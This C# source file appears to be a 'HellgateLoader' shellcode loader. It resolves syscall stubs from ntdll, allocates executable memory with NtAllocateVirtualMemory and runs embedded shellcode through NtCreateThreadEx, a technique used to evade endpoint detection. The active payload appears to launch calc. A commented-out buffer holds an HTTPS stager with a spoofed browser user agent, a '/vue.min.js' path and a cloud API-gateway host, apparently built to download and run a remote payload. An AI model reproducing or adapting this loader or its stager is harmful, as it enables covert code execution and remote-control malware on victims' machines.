using HellgateLoader.SyscallRes;
using HellgateLoader.Utils;
using System;
using System.Linq;
using System.Runtime.InteropServices;


namespace HellgateLoader
{
    class Program
    {
        public static void InvokeHellGate()
        {
            string filename_path = @"C:\Windows\System32\ntdll.dll";

            SyscallFunctions Syscall_funcitons = new SyscallFunctions();
            bool Generate_status = Syscall_funcitons.GenerateRWXMemorySegment();

            if (Generate_status == false)
            {
                Console.WriteLine("Cannot generate RWX memory!");
                System.Threading.Thread.Sleep(10000);
                return;
            }

            ModuleUtil.SetSyscallTable(filename_path);

            for (int count = 0; count < SyscallTable.Syscall_list.Count(); count++)
            {
                for (int index = 0; index < SyscallTable.Syscall_list[count].syscall_byte.Length; index++)
                {
                    Console.Write(SyscallTable.Syscall_list[count].syscall_byte[index]);
                }
                Console.Write("\n");
            }

            byte[] buf1 = new byte[273] {
                0xfc,0x48,0x83,0xe4,0xf0,0xe8,0xc0,0x00,0x00,0x00,0x41,0x51,0x41,0x50,0x52,
                0x51,0x56,0x48,0x31,0xd2,0x65,0x48,0x8b,0x52,0x60,0x48,0x8b,0x52,0x18,0x48,
                0x8b,0x52,0x20,0x48,0x8b,0x72,0x50,0x48,0x0f,0xb7,0x4a,0x4a,0x4d,0x31,0xc9,
                0x48,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0x41,0xc1,0xc9,0x0d,0x41,
                0x01,0xc1,0xe2,0xed,0x52,0x41,0x51,0x48,0x8b,0x52,0x20,0x8b,0x42,0x3c,0x48,
                0x01,0xd0,0x8b,0x80,0x88,0x00,0x00,0x00,0x48,0x85,0xc0,0x74,0x67,0x48,0x01,
                0xd0,0x50,0x8b,0x48,0x18,0x44,0x8b,0x40,0x20,0x49,0x01,0xd0,0xe3,0x56,0x48,
                0xff,0xc9,0x41,0x8b,0x34,0x88,0x48,0x01,0xd6,0x4d,0x31,0xc9,0x48,0x31,0xc0,
                0xac,0x41,0xc1,0xc9,0x0d,0x41,0x01,0xc1,0x38,0xe0,0x75,0xf1,0x4c,0x03,0x4c,
                0x24,0x08,0x45,0x39,0xd1,0x75,0xd8,0x58,0x44,0x8b,0x40,0x24,0x49,0x01,0xd0,
                0x66,0x41,0x8b,0x0c,0x48,0x44,0x8b,0x40,0x1c,0x49,0x01,0xd0,0x41,0x8b,0x04,
                0x88,0x48,0x01,0xd0,0x41,0x58,0x41,0x58,0x5e,0x59,0x5a,0x41,0x58,0x41,0x59,
                0x41,0x5a,0x48,0x83,0xec,0x20,0x41,0x52,0xff,0xe0,0x58,0x41,0x59,0x5a,0x48,
                0x8b,0x12,0xe9,0x57,0xff,0xff,0xff,0x5d,0x48,0xba,0x01,0x00,0x00,0x00,0x00,
                0x00,0x00,0x00,0x48,0x8d,0x8d,0x01,0x01,0x00,0x00,0x41,0xba,0x31,0x8b,0x6f,
                0x87,0xff,0xd5,0xbb,0xf0,0xb5,0xa2,0x56,0x41,0xba,0xa6,0x95,0xbd,0x9d,0xff,
                0xd5,0x48,0x83,0xc4,0x28,0x3c,0x06,0x7c,0x0a,0x80,0xfb,0xe0,0x75,0x05,0xbb,
                0x47,0x13,0x72,0x6f,0x6a,0x00,0x59,0x41,0x89,0xda,0xff,0xd5,0x63,0x61,0x6c,
                0x63,0x00,0xc3
            };

            // byte[] buf1 = new byte[872] { 0xfc, 0xe8, 0x89, 0x00, 0x00, 0x00, 0x60, 0x89, 0xe5, 0x31, 0xd2, 0x64, 0x8b, 0x52, 0x30, 0x8b, 0x52, 0x0c, 0x8b, 0x52, 0x14, 0x8b, 0x72, 0x28, 0x0f, 0xb7, 0x4a, 0x26, 0x31, 0xff, 0x31, 0xc0, 0xac, 0x3c, 0x61, 0x7c, 0x02, 0x2c, 0x20, 0xc1, 0xcf, 0x0d, 0x01, 0xc7, 0xe2, 0xf0, 0x52, 0x57, 0x8b, 0x52, 0x10, 0x8b, 0x42, 0x3c, 0x01, 0xd0, 0x8b, 0x40, 0x78, 0x85, 0xc0, 0x74, 0x4a, 0x01, 0xd0, 0x50, 0x8b, 0x48, 0x18, 0x8b, 0x58, 0x20, 0x01, 0xd3, 0xe3, 0x3c, 0x49, 0x8b, 0x34, 0x8b, 0x01, 0xd6, 0x31, 0xff, 0x31, 0xc0, 0xac, 0xc1, 0xcf, 0x0d, 0x01, 0xc7, 0x38, 0xe0, 0x75, 0xf4, 0x03, 0x7d, 0xf8, 0x3b, 0x7d, 0x24, 0x75, 0xe2, 0x58, 0x8b, 0x58, 0x24, 0x01, 0xd3, 0x66, 0x8b, 0x0c, 0x4b, 0x8b, 0x58, 0x1c, 0x01, 0xd3, 0x8b, 0x04, 0x8b, 0x01, 0xd0, 0x89, 0x44, 0x24, 0x24, 0x5b, 0x5b, 0x61, 0x59, 0x5a, 0x51, 0xff, 0xe0, 0x58, 0x5f, 0x5a, 0x8b, 0x12, 0xeb, 0x86, 0x5d, 0x68, 0x6e, 0x65, 0x74, 0x00, 0x68, 0x77, 0x69, 0x6e, 0x69, 0x54, 0x68, 0x4c, 0x77, 0x26, 0x07, 0xff, 0xd5, 0xe8, 0x00, 0x00, 0x00, 0x00, 0x31, 0xff, 0x57, 0x57, 0x57, 0x57, 0x57, 0x68, 0x3a, 0x56, 0x79, 0xa7, 0xff, 0xd5, 0xe9, 0xa4, 0x00, 0x00, 0x00, 0x5b, 0x31, 0xc9, 0x51, 0x51, 0x6a, 0x03, 0x51, 0x51, 0x68, 0xbb, 0x01, 0x00, 0x00, 0x53, 0x50, 0x68, 0x57, 0x89, 0x9f, 0xc6, 0xff, 0xd5, 0x50, 0xe9, 0x8c, 0x00, 0x00, 0x00, 0x5b, 0x31, 0xd2, 0x52, 0x68, 0x00, 0x32, 0xc0, 0x84, 0x52, 0x52, 0x52, 0x53, 0x52, 0x50, 0x68, 0xeb, 0x55, 0x2e, 0x3b, 0xff, 0xd5, 0x89, 0xc6, 0x83, 0xc3, 0x50, 0x68, 0x80, 0x33, 0x00, 0x00, 0x89, 0xe0, 0x6a, 0x04, 0x50, 0x6a, 0x1f, 0x56, 0x68, 0x75, 0x46, 0x9e, 0x86, 0xff, 0xd5, 0x5f, 0x31, 0xff, 0x57, 0x57, 0x6a, 0xff, 0x53, 0x56, 0x68, 0x2d, 0x06, 0x18, 0x7b, 0xff, 0xd5, 0x85, 0xc0, 0x0f, 0x84, 0xca, 0x01, 0x00, 0x00, 0x31, 0xff, 0x85, 0xf6, 0x74, 0x04, 0x89, 0xf9, 0xeb, 0x09, 0x68, 0xaa, 0xc5, 0xe2, 0x5d, 0xff, 0xd5, 0x89, 0xc1, 0x68, 0x45, 0x21, 0x5e, 0x31, 0xff, 0xd5, 0x31, 0xff, 0x57, 0x6a, 0x07, 0x51, 0x56, 0x50, 0x68, 0xb7, 0x57, 0xe0, 0x0b, 0xff, 0xd5, 0xbf, 0x00, 0x2f, 0x00, 0x00, 0x39, 0xc7, 0x75, 0x07, 0x58, 0x50, 0xe9, 0x7b, 0xff, 0xff, 0xff, 0x31, 0xff, 0xe9, 0x91, 0x01, 0x00, 0x00, 0xe9, 0xc9, 0x01, 0x00, 0x00, 0xe8, 0x6f, 0xff, 0xff, 0xff, 0x2f, 0x76, 0x75, 0x65, 0x2e, 0x6d, 0x69, 0x6e, 0x2e, 0x6a, 0x73, 0x00, 0x15, 0x1a, 0xe9, 0xfc, 0xb0, 0x27, 0x27, 0xf0, 0x59, 0xd2, 0x66, 0x9a, 0xeb, 0x6f, 0x30, 0x1c, 0xcc, 0xd1, 0xa7, 0x50, 0x6c, 0x95, 0xfa, 0x59, 0xc0, 0x0c, 0xda, 0xc1, 0x6f, 0x57, 0x98, 0x14, 0x0d, 0x14, 0x12, 0x76, 0xf8, 0x96, 0x80, 0x45, 0xd5, 0x5a, 0x1e, 0x0b, 0xef, 0x32, 0x4a, 0x69, 0x25, 0x62, 0x1f, 0x63, 0xa3, 0x79, 0x3c, 0x6a, 0x8f, 0x4f, 0x16, 0x02, 0xf4, 0x9c, 0x11, 0x69, 0x0a, 0x29, 0x2b, 0x00, 0x55, 0x73, 0x65, 0x72, 0x2d, 0x41, 0x67, 0x65, 0x6e, 0x74, 0x3a, 0x20, 0x4d, 0x6f, 0x7a, 0x69, 0x6c, 0x6c, 0x61, 0x2f, 0x35, 0x2e, 0x30, 0x20, 0x28, 0x4d, 0x61, 0x63, 0x69, 0x6e, 0x74, 0x6f, 0x73, 0x68, 0x3b, 0x20, 0x49, 0x6e, 0x74, 0x65, 0x6c, 0x20, 0x4d, 0x61, 0x63, 0x20, 0x4f, 0x53, 0x20, 0x58, 0x20, 0x31, 0x30, 0x2e, 0x31, 0x35, 0x3b, 0x20, 0x72, 0x76, 0x3a, 0x38, 0x30, 0x2e, 0x30, 0x29, 0x20, 0x47, 0x65, 0x63, 0x6b, 0x6f, 0x2f, 0x32, 0x30, 0x31, 0x30, 0x30, 0x31, 0x30, 0x31, 0x20, 0x46, 0x69, 0x72, 0x65, 0x66, 0x6f, 0x78, 0x2f, 0x38, 0x30, 0x2e, 0x30, 0x0d, 0x0a, 0x00, 0xbb, 0x8c, 0x2d, 0x37, 0xb9, 0xcc, 0x0e, 0x0c, 0x3d, 0x0b, 0x5a, 0x19, 0x0e, 0xba, 0x93, 0x9c, 0xbf, 0xa6, 0x23, 0xee, 0xe0, 0x03, 0x78, 0xf5, 0x8a, 0x6b, 0xf5, 0x5d, 0x05, 0x55, 0x9d, 0x57, 0x8a, 0x6c, 0x53, 0x27, 0x28, 0x3c, 0xb9, 0x59, 0x92, 0x1b, 0x6e, 0x5f, 0x32, 0x98, 0x8f, 0x02, 0x35, 0xad, 0x2f, 0x83, 0x24, 0xea, 0x8a, 0x25, 0x3e, 0xa2, 0x10, 0xf7, 0xa5, 0x78, 0x9a, 0x03, 0xde, 0xdd, 0x52, 0x51, 0x20, 0x55, 0x20, 0xf7, 0x4e, 0xa5, 0xc1, 0xe1, 0x2c, 0x87, 0x91, 0x2f, 0x3a, 0x91, 0xec, 0x63, 0x70, 0xa6, 0x94, 0xea, 0x28, 0x3a, 0xc0, 0xd1, 0x5a, 0x25, 0xe7, 0x25, 0xed, 0xb5, 0x80, 0xac, 0x96, 0xb6, 0x84, 0x9d, 0x53, 0x77, 0x4e, 0xa9, 0xfb, 0x6b, 0x79, 0xda, 0x58, 0xd8, 0x4a, 0x2a, 0x9a, 0x3b, 0x99, 0x5b, 0xbb, 0x92, 0xe4, 0xbe, 0xec, 0xdd, 0xe1, 0x1f, 0xb3, 0xf3, 0x01, 0x0a, 0x4f, 0x41, 0x48, 0xdc, 0x5c, 0x99, 0xfe, 0x55, 0x92, 0x88, 0x50, 0x43, 0xf7, 0x42, 0xf5, 0xf0, 0x3a, 0xdd, 0xce, 0xb7, 0x93, 0xd0, 0xb1, 0x96, 0xc6, 0xca, 0xc5, 0x5e, 0xaa, 0x4f, 0x81, 0x76, 0x7b, 0xaf, 0x6d, 0x40, 0x1c, 0x8a, 0x7c, 0xe1, 0x24, 0x38, 0x7d, 0xbe, 0x31, 0x18, 0x16, 0x90, 0x40, 0x68, 0x1f, 0x30, 0x23, 0x45, 0xc3, 0x83, 0x42, 0x24, 0x2e, 0x25, 0x3b, 0x9b, 0x83, 0x34, 0xd5, 0xb3, 0x27, 0x85, 0xa6, 0x9c, 0x14, 0xdf, 0x91, 0xe1, 0x00, 0x68, 0xf0, 0xb5, 0xa2, 0x56, 0xff, 0xd5, 0x6a, 0x40, 0x68, 0x00, 0x10, 0x00, 0x00, 0x68, 0x00, 0x00, 0x40, 0x00, 0x57, 0x68, 0x58, 0xa4, 0x53, 0xe5, 0xff, 0xd5, 0x93, 0xb9, 0x00, 0x00, 0x00, 0x00, 0x01, 0xd9, 0x51, 0x53, 0x89, 0xe7, 0x57, 0x68, 0x00, 0x20, 0x00, 0x00, 0x53, 0x56, 0x68, 0x12, 0x96, 0x89, 0xe2, 0xff, 0xd5, 0x85, 0xc0, 0x74, 0xc6, 0x8b, 0x07, 0x01, 0xc3, 0x85, 0xc0, 0x75, 0xe5, 0x58, 0xc3, 0xe8, 0x89, 0xfd, 0xff, 0xff, 0x73, 0x65, 0x72, 0x76, 0x69, 0x63, 0x65, 0x2d, 0x6f, 0x30, 0x76, 0x32, 0x68, 0x74, 0x32, 0x6d, 0x2d, 0x31, 0x32, 0x35, 0x38, 0x35, 0x31, 0x35, 0x37, 0x33, 0x30, 0x2e, 0x67, 0x7a, 0x2e, 0x61, 0x70, 0x69, 0x67, 0x77, 0x2e, 0x74, 0x65, 0x6e, 0x63, 0x65, 0x6e, 0x74, 0x63, 0x73, 0x2e, 0x63, 0x6f, 0x6d, 0x00, 0x51, 0x09, 0xbf, 0x6d };


            // Allocate Memory
            IntPtr pBaseAddres = IntPtr.Zero;
            IntPtr Region = (IntPtr)buf1.Length;

            IntPtr getcurrent = new IntPtr(-1);
            UInt32 ntstatus = Syscall_funcitons.NtAllocateVirtualMemory(
                getcurrent,
                ref pBaseAddres,
                IntPtr.Zero,
                ref Region,
                0x2000 | 0x1000,
                0x40);

            Marshal.Copy(buf1, 0, pBaseAddres, buf1.Length);

            IntPtr hThread = IntPtr.Zero;
            ntstatus = Syscall_funcitons.NtCreateThreadEx(
                out hThread,
                0x1FFFFF,
                IntPtr.Zero,
                getcurrent,
                pBaseAddres,
                IntPtr.Zero,
                false,
                0,
                0,
                0,
                IntPtr.Zero);

            ntstatus = Syscall_funcitons.NtWaitForSingleObject(hThread, true, 0);
            return;
        }

        static void Main(string[] args)
        {
            InvokeHellGate();

        }
    }
}
